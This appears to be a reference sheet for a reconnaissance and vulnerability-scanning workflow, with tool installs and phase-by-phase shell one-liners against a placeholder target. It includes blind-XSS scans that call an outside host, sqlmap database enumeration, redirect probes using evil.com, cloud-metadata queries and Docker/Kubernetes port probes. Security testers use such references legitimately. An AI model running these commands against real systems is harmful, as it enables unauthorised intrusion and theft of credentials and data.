# Tool Reference — Predator Recon v2.0

## Installation

### Go Tools
```bash
# Core
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/OWASP/Amass/v3/...@master
go install github.com/tomnomnom/assetfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/katana/cmd/katana@latest
go install github.com/lc/gau/v2/cmd/gau@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install github.com/hahwul/dalfox/v2@latest
go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
go install github.com/tomnomnom/anew@latest
go install github.com/tomnomnom/qsreplace@latest
go install github.com/tomnomnom/hacks/kxss@latest
go install github.com/KathanP19/Gxss@latest
go install github.com/d3mondev/puredns/v2@latest
go install -v github.com/LukaSikic/subzy@latest
go install github.com/Tanmay-N/CORS-Scanner@latest
go install github.com/gwen001/github-endpoints@latest
go install github.com/gwen001/github-subdomains@latest
go install github.com/0x88/crtfinder@latest
go install github.com/Ractiurd/jscracker@latest
```

### Python Tools
```bash
pip install waymore uro sqlmap paramspider arjun tplmap
```

### Wordlists
```bash
mkdir -p ~/wordlists ~/resolvers
# Best DNS wordlist
curl -s https://github.com/danielmiessler/SecLists/raw/master/Discovery/DNS/subdomains-top1million-110000.txt -o ~/wordlists/best-dns-wordlist.txt
# Resolvers
curl -s https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt -o ~/resolvers.txt
```

## One-Liners by Phase

### Phase 1: Subdomain Enum
```bash
# Passive
subfinder -d target.com -all -o subs.txt
assetfinder --subs-only target.com | anew subs.txt
amass enum -passive -d target.com -o amass.txt
crtfinder -d target.com | anew subs.txt

# Active (if calculus allows)
puredns bruteforce ~/wordlists/best-dns-wordlist.txt target.com -r ~/resolvers.txt | anew subs.txt

# Resolve + HTTP probe
cat subs.txt | puredns resolve -r ~/resolvers.txt -w resolved.txt
cat resolved.txt | httpx -silent -mc 200,301,302,403,401 -title -tech-detect -status-code -o live.txt
```

### Phase 2: URL/Param Harvest
```bash
# Historical
waymore -i target.com -mode U -oU urls.txt
gau target.com --subs | anew urls.txt
katana -u https://target.com -jc -kf all -silent | anew urls.txt

# Dedup + Live
cat urls.txt | uro | anew urls-dedup.txt
cat urls-dedup.txt | httpx -silent -mc 200 -o live-urls.txt

# Params + JS
cat live-urls.txt | grep "=" | anew params.txt
cat urls-dedup.txt | grep "\.js$" | httpx -mc 200 -silent | anew js-files.txt
```

### Phase 3: JS Hunting
```bash
# Download JS
cat js-files.txt | while read url; do wget -q -P js/ -nd -r -l1 -A.js "$url"; done

# Secrets
jscracker -f js/ -o js-secrets.txt
grep -rE "(api[_-]?key|secret|token|password)" js/ | anew js-secrets.txt

# Endpoints
grep -rEo "(https?://|/api/|/v[0-9]/)[^\"'<> ]+" js/ | sort -u > js-endpoints.txt
```

### Phase 4: Vuln Scanning
```bash
# XSS
cat params.txt | Gxss -c 100 -p XssReflected | dalfox pipe -b https://xss.bug -w 100 -o xss.txt
cat params.txt | dalfox pipe -b https://xss.bug -blind -w 50 -o xss-blind.txt

# SQLi
sqlmap -m params.txt --batch --random-agent --level 1 --tamper=space2comment --dbs -o sqli.txt

# SSRF
nuclei -l live-urls.txt -t ssrf/ -silent -rate-limit 100 -o ssrf.txt

# CORS
cat live-urls.txt | CORS-Scanner

# Redirect
cat params.txt | grep -E "(url|redirect|next|return|goto)=http" | qsreplace "https://evil.com" | while read url; do curl -s -L "$url" -I | grep -i "evil.com" && echo "$url"; done

# Nuclei full
nuclei -l live-urls.txt -t vulnerabilities/ -t cves/ -t exposures/ -t misconfiguration/ -t fuzzing-templates/ -t ssl/ -t dns/ -t takeovers/ -severity critical,high,medium -rate-limit 100 -silent -o nuclei.txt

# Takeover
nuclei -l live.txt -t takeovers/ -silent -o takeover.txt
subzy run --targets live.txt | anew takeover.txt
```

### Phase 5: Infrastructure
```bash
# Port scan
naabu -rate 10000 -l live.txt -top-ports 1000 -silent -o ports.txt

# Cloud metadata
for ip in $(cat live-ips.txt); do
  for ep in "http://169.254.169.254/latest/meta-data/" "http://metadata.google.internal/computeMetadata/v1/"; do
    curl -s -m 2 -H "Metadata-Flavor: Google" "$ep" && echo "$ip: $ep"
  done
done

# K8s/Docker
for port in 10250 10255 2375 2376 6443 8443; do
  timeout 2 bash -c "cat < /dev/null > /dev/tcp/$ip/$port" && echo "$ip:$port (k8s/docker)"
done
```

### Phase 6: On-Chain
```bash
# Contract bytecode
cast code $CONTRACT --rpc-url $RPC

# Storage slots (0-49)
for i in {0..49}; do cast storage $CONTRACT $i --rpc-url $RPC; done

# Common calls
cast call $CONTRACT "totalSupply()(uint256)" --rpc-url $RPC
cast call $CONTRACT "balanceOf(address)(uint256)" 0x000... --rpc-url $RPC
cast call $CONTRACT "owner()(address)" --rpc-url $RPC
```

## Tool Versions (Config)
See `config/tools.yaml` for version, timeout, args, and rate limits.